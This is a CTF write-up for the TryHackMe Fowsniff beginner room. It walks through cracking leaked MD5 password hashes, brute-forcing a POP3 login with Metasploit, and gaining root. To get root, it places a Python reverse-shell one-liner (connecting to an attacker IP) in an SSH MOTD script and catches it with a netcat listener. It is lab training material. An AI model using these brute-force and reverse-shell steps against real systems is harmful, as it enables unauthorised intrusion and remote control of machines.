---
tags:
  - THM
link: https://tryhackme.com/room/ctf
description: Hack this machine and get the flag. There are lots of hints along the way and is perfect for beginners!
---
## Summary

| SECTION/TASK                                 | FLAG |
| -------------------------------------------- | ---- |
| Task 1. Hack into the FowSniff organisation. |      |

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 1. Hack into the FowSniff organisation.

This boot2root machine is brilliant for new starters. You will have to enumerate this machine by finding open ports, do some online research (its amazing how much information Google can find for you), decoding hashes, brute forcing a pop3 login and much more!

This will be structured to go through what you need to do, step by step. Make sure you are [connected to our network](http://tryhackme.com/access)

Credit to [berzerk0](https://twitter.com/berzerk0) for creating this machine. This machine is used here with the explicit permission of the creator <3
<div>
<br>
<br>
</div>

### Questions

##### Deploy the machine. On the top right of this you will see a **Deploy** button. Click on this to deploy the machine into the cloud. Wait a minute for it to become live.
==No answer needed==
<div>
<br>
<br>
</div>

##### Using nmap, scan this machine. What ports are open?
==No answer needed==
<div>
<br>
<br>
</div>

##### Using the information from the open ports. Look around. What can you find?
==No answer needed==
<div>
<br>
<br>
</div>

##### Using Google, can you find any public information about them?
==No answer needed==
<div>
<br>
<br>
</div>

##### Can you decode these md5 hashes? You can even use sites like [hashkiller](https://hashkiller.io/listmanager) to decode them.
==No answer needed==

The passwords you find on https://github.com/berzerk0/Fowsniff/blob/main/fowsniff.txt are MD5 hashes. These can be easily decoded using a site like [Hashes.com](https://hashes.com/en/decrypt/hash?ref=blog.razrsec.uk) - just copy and paste the hashes, complete the captcha and hit submit.

![[Pasted image 20251126155022.png]]

We've managed to decode 8 out of 9 hashed passwords:
```
0e9588cb62f4b6f27e33d449e2ba0b3b:carp4ever
19f5af754c31f1e2651edde9250d69bb:skyler22
1dc352435fecca338acfd4be10984009:apples01
4d6e42f56e127803285a0a7649b5ab11:orlando12
8a28a94a588a95b80163709ab4313aa4:mailcall
90dc16d47114aa13671c697fd506cf26:scoobydoo2
ae1644dac5b77c0cf51e0d26ad6d7e56:bilbo101
f7fd98d380735e859f8b2ffbbede5a7e:07011972
```
<div>
<br>
<br>
</div>

##### Using the usernames and passwords you captured, can you use metasploit to brute force the pop3 login?
==No answer needed==

Before running metasploit, we will create two custom lists - one for usernames and one for passwords.

```
┌──(root㉿kali)-[/home/kali/ET/THM/Fowsniff CTF]
└─# cat fowsniffusers
mauer@fowsniff
mustikka@fowsniff
tegel@fowsniff
baksteen@fowsniff
seina@fowsniff
mursten@fowsniff
parede@fowsniff
sciana@fowsniff


┌──(root㉿kali)-[/home/kali/ET/THM/Fowsniff CTF]
└─# cat fowsniffpass 
carp4ever
skyler22
apples01
orlando12
mailcall
scoobydoo2
bilbo101
07011972
```

Using the `_/auxiliary/scanner/pop3/pop3_login_ module` in Metasploit, we can attempt to brute force the POP3 service using our custom lists we just created.
Set the required parameters then run your exploit.

```
use auxiliary/scanner/pop3/pop3_login
set RHOSTS 10.10.110.111
set USER_FILE users.txt
set PASS_FILE pass.txt
set VERBOSE false
set STOP_ON_SUCCESS true
exploit
```


<div>
<br>
<br>
</div>

##### What was seina's password to the email service?
<div>
<br>
<br>
</div>

##### Can you connect to the pop3 service with her credentials? What email information can you gather?
==No answer needed==
<div>
<br>
<br>
</div>

##### Looking through her emails, what was a temporary password set for her?
<div>
<br>
<br>
</div>

##### In the email, who send it? Using the password from the previous question and the senders username, connect to the machine using SSH.
==No answer needed==
<div>
<br>
<br>
</div>

##### Once connected, what groups does this user belong to? Are there any interesting files that can be run by that group?
==No answer needed==
<div>
<br>
<br>
</div>

##### Now you have found a file that can be edited by the group, can you edit it to include a reverse shell?

Python Reverse Shell:

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<IP>,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

Other reverse shells: [here](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).
==No answer needed==
<div>
<br>
<br>
</div>

##### If you have not found out already, this file is run as root when a user connects to the machine using SSH. We know this as when we first connect we can see we get given a banner (with fowsniff corp). Look in **/etc/update-motd.d/** file. If (after we have put our reverse shell in the cube file) we then include this file in the motd.d file, it will run as root and we will get a reverse shell as root!
==No answer needed==
<div>
<br>
<br>
</div>

##### Start a netcat listener (nc -lvp 1234) and then re-login to the SSH service. You will then receive a reverse shell on your netcat session as root!
==No answer needed==
<div>
<br>
<br>
</div>

##### If you are **really really** stuck, there is a brilliant walkthrough here: [https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/](https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/) **[](https://www.hackingarticles.in/fowsniff-1-vulnhub-walkthrough/)**<br><br>If its easier, follow this walkthrough with the deployed machine on the site.
==No answer needed==
<div>
<br>
<br>
</div>

<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

